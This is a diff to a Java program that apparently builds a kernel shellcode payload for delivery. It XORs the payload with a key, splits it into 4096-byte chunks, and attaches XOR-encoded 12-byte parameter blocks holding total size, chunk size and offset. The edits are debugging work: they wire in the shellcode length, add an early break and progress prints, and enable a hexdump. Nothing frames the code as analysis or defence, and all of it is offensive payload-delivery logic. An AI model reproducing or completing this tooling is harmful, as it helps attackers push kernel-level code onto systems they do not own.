@@ -500,37 +500,32 @@ public class Main {
             byte[] currentChunk = new byte[4096];
             byte[] xorBytes = byteXor(combined_bytes, key);
 
-            //int entireShellcodeSize = modifiedKernelBytecode.length;
-            //must pad the value to 4096
-
-            //loop here
-
-            // Assuming these already exist:
-            int kernel_shellcode_size = 0;
-
+            int kernel_shellcode_size = KernelShellcodeBytes.length;
             int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
             int bytesLeft = payload_totalsize;
 
             // IMPORTANT: remainder must be computed BEFORE it is used
             int remainder = payload_totalsize % 4096;
 
-            // malloc equivalent in Java
-            byte[] last_packet = new byte[remainder + 12 + 70];
-            int size_last_packet = remainder + 12 + 70;
+            //byte[] last_packet = new byte[remainder + 12 + 70];
+            //int size_last_packet = remainder + 12 + 70;
 
             int numberofpackets = payload_totalsize / 4096;
 
-            long TotalSizeOfPayload = payload_totalsize;
+            //long TotalSizeOfPayload = payload_totalsize;
             int ChunkSize = 4096;
             int OffsetofChunkinPayload = 0x0000;
-
-            int ctx;
+            int ctx = 0;
             byte[] xorParameters = new byte[12];
             int mergedPacketLen = 0;
 
             System.out.println("Generating the parameters...");
             for (ctx = 0; ctx < payload_totalsize; ) {
-                //generate parameters
+                if(bytesLeft < 4096)
+                {
+                    System.out.println("Bytes left than 4096!");
+                    break;
+                }
 
                 /* =========================
                  * Build parameters
@@ -685,6 +680,10 @@ public class Main {
                 ctx += 4096;
                 OffsetofChunkinPayload += 4096;
             }
+            System.out.println("Total size of payload:  " + payload_totalsize);
+            System.out.println("Bytes Left:  " + bytesLeft);
+            System.out.println("CTX: " + ctx);
+            System.out.println("Offset: " + OffsetofChunkinPayload);
 
             // handle remainder
             if (remainder > 0) {
@@ -717,7 +716,7 @@ public class Main {
                 System.arraycopy(entireSize, 0, parameters, 0, 4);
                 System.arraycopy(chunkSize, 0, parameters, 4, 4);
                 System.arraycopy(offset, 0, parameters, 8, 4);
-                //hexdump(parameters, 16);
+                hexdump(parameters, 16);
 
                 /* =========================
                  * XOR parameters
